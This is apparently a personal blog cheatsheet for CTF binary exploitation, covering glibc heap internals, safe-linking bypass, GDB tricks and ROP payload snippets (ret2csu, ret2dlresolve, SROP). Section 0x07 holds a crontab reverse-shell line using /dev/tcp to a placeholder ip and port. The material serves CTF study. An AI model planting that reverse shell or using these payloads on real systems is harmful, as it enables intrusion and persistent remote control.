---
title: pwn cheatsheet
date: 2022-9-21 20:32:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---



## 0x01 ROPgadget命令

`ROPgadget --binary ./elf --string "/bin/sh"`

`ROPgadget --binary ./elf --only "pop|ret" | grep rdi`

## 0x02 gcc编译指定libc版本

`gcc example.c -o example2.23 -Wl,-rpath='./libc-2.23/' -Wl,-dynamic-linker='./libc-2.23/ld-2.23.so'`

## 0x03 gcc安全编译选项

```
CANNARY
gcc -fno-stack-protector -o test test.c  //禁用栈保护
gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
```

```
NX
gcc -o test test.c                  // 默认情况下，开启NX保护
gcc -z execstack -o test test.c     // 禁用NX保护
gcc -z noexecstack -o test test.c   // 开启NX保护
```

```
PIE
gcc -o test test.c -no-pie             // 不开启PIE
gcc -fpie -pie -o test test.c       // 开启PIE，此时强度为1
gcc -fPIE -pie -o test test.c       // 开启PIE，此时为最高强度2
gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE
gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE
```

```
FORTIFY
gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 
gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查(如果检查到缓冲区溢出，就终止程序)
```

```
ASLR
echo 0 > /proc/sys/kernel/randomize_va_space
```

```
RELRO
gcc -o test test.c                      // 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c           // 关闭，即No RELRO
gcc -z lazy -o test test.c              // 部分开启，即Partial RELRO
gcc -z now -o test test.c               // 全部开启，即
```

## 0x04 system("$0") == system("/bin/sh")

system("$0") == system("/bin/sh")



顺便提一下system("aaaaaaaa;sh;bbbbb") 也是等于system("sh") , 分好在shell中就是命令分隔符

system("aaaaaaaa")执行错误，不影响执行后续的system("sh")

https://youtu.be/_ZnnGZygnzE?t=4522



再顺便提一下`system("/bin/sh")`时卡在`<do_system+1099> movaps xmmword ptr [rsp + 0x40], xmmo`

原因是没有满足栈平衡

解决方法是ROPchain中加一个`ret`



## 0x05 pwndbg中查看状态寄存器

```bash
i r eflags 查看状态寄存器
```



## 0x06 一些汇编指令

1、test与jne、je搭配时，test判断两个操作数是否相同

jne如果不相同则跳转

je如果相同则跳转



2、RAX = 高32位 + EAX

EAX = 高16位 + AX

AX = AH + AL



## 0x07 crontab反弹shell

`* * * * * bash -c "bash -i >& /dev/tcp/ip/port 1>&0"`

crontab常用命令

`crontab -l` 列出当前定时任务

`crontab -e` 编辑定时任务

`crontab file` 从文件中读取定时任务



## 0x08 tcache和largebin大小

64位下 tcache最大放0x410的chunk，largebin从0x400开始



## 0x09 safe-linking加解密与bypass

**1、加密**

![image-20220930000628640](/assets/img/2022/image-20220930000628640.png)

- P为指针本身（也就是原先的fd/next值）， L为指针的地址
  - L >> 12 可以看成是key
  - 也就是原先的fd值 去异或一个 key，得到新的fd值

验证下加密过程：

![image-20220930001151219](/assets/img/2022/image-20220930001151219.png)

图为fastbin链，`chunk2 -> chunk1` ，chunk2原先的fd是chunk1的header=0x555555756510， 现在的加密后的fd是0x0000555000203246

手动计算验证一下：P为原先的fd=0x555555756510，L为指针的地址=0x555555756570

`P' =(0x555555756570 >> 12) ^ 0x555555756510 =0x555000203246  ` ，和图上的一样



**2、解密**

众所周知，异或操作是可逆的

称`L >> 12`为**KEY**

`P' = KEY ^ P`

`P' ^ KEY = (KEY ^ P) ^ KEY = 0 ^ P = P`

也就是说只要把加密后的fd，再异或个`L >> 12` 也就是原先的fd了



**3、解密的关键**

所以说leak出 `L>>12` 是关键

然后你会发现fastbin/tcache的尾节点（意思 `tcache -> chunk3 -> chunk2 -> chunk1`中的chunk1）

它原先的fd是0

根据公式`P' = KEY ^ P`，而P是0， 所以`P'=KEY`，意思尾节点chunk的fd中记录着的就是KEY

只要leak它就能拿到KEY，然后这个加解密就形同虚设了

当然不一定要leak这个KEY，直接leak出堆地址也是可以的，把堆地址右移12也是一样的。

**总结一下解密的关键：**

- L>>12
- 堆地址



**4、利用**

把伪造的fd 和 KEY 异或一下，填入就可以



### bypass

待补充

https://www.anquanke.com/post/id/206457

https://www.anquanke.com/post/id/207770

**Ref.**

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/

https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation

https://www.anquanke.com/post/id/206457

https://www.anquanke.com/post/id/207770



## 0x10 glibc 2.32引入的变化

- 引入了safe-linking

- 引入了对tcache和fastbins中申请及释放内存地址的对齐检测，内存地址需要以0x10字节对齐
  - http://blog.nsfocus.net/glibc-234/

修复了

- 原有tcache poisoning、fastbin attack等通过直接覆盖chunk->next指针达到任意地址申请的利用方法

- 由于检测了申请地址是否以0x10对齐，fastbin attack的利用办法受到限制，例如经典的通过错位构造”\x7f”劫持malloc_hook和IO_FILE的利用办法。

待补充

http://blog.nsfocus.net/glibc-234/

**Ref.**

https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773



## 0x11 malloc_consolidate调用点

`malloc_consolidate`负责将fastbin中的chunk合并放入unsorted bin中，防止内存过于碎片化。

glibc为了加速内存分配，引入了fastbin这一缓冲区，fastbin中的chunk的inuse位不会被清空，使得chunk在释放时不会被合并。

fastbin中的chunk的整理就由`malloc_consolidate`负责。

malloc.c中`malloc_consolidate`有以下几个调用点

- malloc中

1、smallbin初始化会通过`malloc_consolidate`进行

2、申请largebin size的chunk时会先进行

3、当fastbin和bins中没找到匹配的chunk，并且Top也不够大无法分配chunk时。这时会调用`malloc_consolidate`

- free中

1、释放的chunk size大于`FASTBIN_CONSOLIDATION_THRESHOLD`。`FASTBIN_CONSOLIDATION_THRESHOLD`默认等于65536（0x10000）

**释放的chunk size是已经prev/next chunk unlink合并完成后的size，当然合入top的情况也包括在内**

- malloc_trim/mallopt/mallinfo

1、使用`malloc_consolidate`初始化`av`



## 0x12 各种pow整理



爆破sha256

```python
from pwn import *
import hashlib

def is_ok(x, prefix):
    return bin(int(hashlib.sha256(prefix+x.encode()).hexdigest().encode('hex'), 16))[2:].rjust(256, '0').startwith("0"*26)
prefix = raw_input("pow:").strip()
print(repr(prefix))
s = util.iters.mbruteforce(lambda x:is_ok(x, prefix), string.ascii_letters+string.digits, 5, 'fixed')
print(s)
```





## 0x13 pwn题中的alarm patch

用vim打开elf，搜索`alarm`，然后改成`isnan`，保存





## 0x14 pwn题中栈地址泄露的方法

- 通过libc的environ symbol，libc的environ记录了栈真实地址，满足以下两个条件就可以leak出栈地址
  - libc基地址已经泄露
  - 具有任意地址读的能力，需要读libc environ处的值



## 0x15 GDB调试技巧

- gdb中快速调用glibc中的函数，如malloc和free，不用再修改C代码了

```sh
p $a=__malloc(0x20)
p __free($a)
```

- gdb源码调试

1. 下载源码

使用glibc-all-in-one里的build脚本，修改一下，把最后的编译步骤去掉。默认会下载到/glibc目录下

2. gdb中设置glibc源码目录

参考：[https://blog.csdn.net/albertsh/article/details/107437084](https://blog.csdn.net/albertsh/article/details/107437084)

显示当前加载的目录：`show dir`

设置glibc源码目录：`dir /glibc/2.33/source/malloc`

建议一次多加几个常用目录：`dir /glibc/2.33/source/malloc:/glibc/2.33/source/stdio-common:/glibc/2.33/source/stdlib:/glibc/2.33/source/libio`

## 0x16 关于malloc，glibc设置的一些默认值

```c
#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)  64bit下等于0x80
#define DEFAULT_TRIM_THRESHOLD (128 * 1024)
#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)  等于0x20000
#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN
#define DEFAULT_MMAP_MAX       (65536)

top chunk，默认0x21000大小，也就是132KB
Linux默认页大小4kb，0x1000
```



## 0x17 mmap多少的内存可以实现mmap-libc挨着的布局

```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555555000 r-xp     1000 0      /home/sirius/ctf/file_structure/WannaHeap/test
    0x555555754000     0x555555755000 r--p     1000 0      /home/sirius/ctf/file_structure/WannaHeap/test
    0x555555755000     0x555555756000 rw-p     1000 1000   /home/sirius/ctf/file_structure/WannaHeap/test
    0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
↓    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      [anon_7ffff7dcf]
.    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
.    0x7ffff7fac000     0x7ffff7fdf000 rw-p    33000 0      [anon_7ffff7fac]
.    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]
.    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]
↑    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
     0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

上图指出了mmap的范围，那最大容纳的大小就是`0x7ffff7ffc000-0x7ffff7dfc000=0x200000`了，超过这个大小就只能放在heap之前了

```
0x7ffff780f000     0x7ffff7a10000 rw-p   201000 0      [anon_7ffff780f]  <=== mmap出来的
0x7ffff7a10000     0x7ffff7bce000 r-xp   1be000 0      /home/sirius/glibc-all-in-one/libs/2.24-9ubuntu2.2_amd64/libc-2.24.so
```



## 0x18 setcontext这个gadget

- 很强大，可以控制一大堆寄存器，ROP神器
- 介绍参考：[pwn题堆利用的一些姿势 -- setcontext](https://blog.csdn.net/A951860555/article/details/118268484)

>这里我们着重关注一下修改rsp和rcx寄存器的两行代码，mov rsp, [rdi+0xa0]和mov rcx, [rdi+0xa8]。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行截图中最后的retn操作，而retn的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力。
>
>这里程序流程可以解释如下：执行free或者malloc后跳转到setcontext+53，然后将rsp指针指向orw链，然后修改rcx的值为ret指令的地址，push rcx，至于其它寄存器的值此处可以不用在意，最后执行setcontext末尾后紧邻的retn，栈头出栈也还是ret指令，然后继续弹出，此时的rsp指向的地址正好是orw链的开头。

- glibc2.28之前通过rdi调整寄存器，2.28及之后通过rdx调整寄存器
  - 需要找到形如`mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]`的gadget
  - 然后就可以继续使用setcontext了
- 可以搭配mprotect使用，然后可以直接运行shellcode了
  - [https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect](https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect)

​	

## 0x19 strdup

`strdup(char *s) equal to  malloc(strlen(s) + 1)`

e.g. 

`strdup(0x17) -> malloc(0x18) -> chunksize: 0x20`

`strdup(0x18) -> malloc(0x19) -> chunksize: 0x30`



## 0x20 End of file [CTRL+D]

- You can send string without ending it with a new line `\n` character using `CTRL+D` instead of `ENTER` .
- It is useful if you want to send for example 16x`A` char in command line or using **GDB**.
- It is possible as well with pwntools with`process.send("A"*16)` .



## 0x21 ROP trick：ret2csu

ret2csu中有两个比较好用的gadget片段

```shell
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

`loc_400600`可以控制edi，rsi，rdx，然后call target funciton

`loc_400616`可以控制一些寄存器

payload:

```py
csu_front_addr = 0x400600 # mov rdx, r13;
csu_end_addr = 0x40061A # pop rbx;

#根据glibc的版本不同参数的位置也要进行相应的调整
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload # payload后面可以再接任意返回地址，接着ROP
```



## 0x22 ROP trick: ret2dlresolve

原理：

- [https://ray-cp.github.io/archivers/ret2dl_resolve_analysis](https://ray-cp.github.io/archivers/ret2dl_resolve_analysis)

- [https://www.slideshare.net/AngelBoy1/re2dlresolve](https://www.slideshare.net/AngelBoy1/re2dlresolve)

工具：

- https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/ret2dlresolve.py

利用：

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)

```python
# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)  # padding to return address
rop.read(0, dlresolve.data_addr)             # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)                 # call .plt and dl-resolve() with the correct, calculated reloc_offset

p.sendline(rop.chain())
p.sendline(dlresolve.payload)                # now the read is called and we pass all the relevant structures in
```

## 0x23 ROP trick: SROP

- [https://www.anquanke.com/post/id/217081](https://www.anquanke.com/post/id/217081)

**从程序流程看**，发生中断时，程序从用户态进入内核态，栈上压入`signal frame`和`sigreturn address`。从内核态返回时，执行`sigreturn syscall`

```
sigreturn
x86：
	mov eax, 0x77
	int 0x80
	
x64:
	mov rax, 0xf
	syscall
```

**从利用角度看**，在栈上伪造sigreturn，如其名Sigreturn Oriented Programming

payload：

```python
frame = SigreturnFrame()
frame.rax = 0x3b # execve
frame.rdi = bin_sh_addr
frame.rip = syscall_ret

payload = 'a'*0x10 # padding to return address
payload += p64(mov_rax_0xf) + p64(syscall_ret) + flat(frame)
```

- 必须确保**syscall** sigreturn时，rsp指向sigreturn frame的首地址
- 有些情况是**call** sigreturn，因为会向栈中压入一个返回地址，所以整体会移动8字节，则构造的fake sigreturn frame从第8字节开始写`str(frame)[8:]`就可以解决了





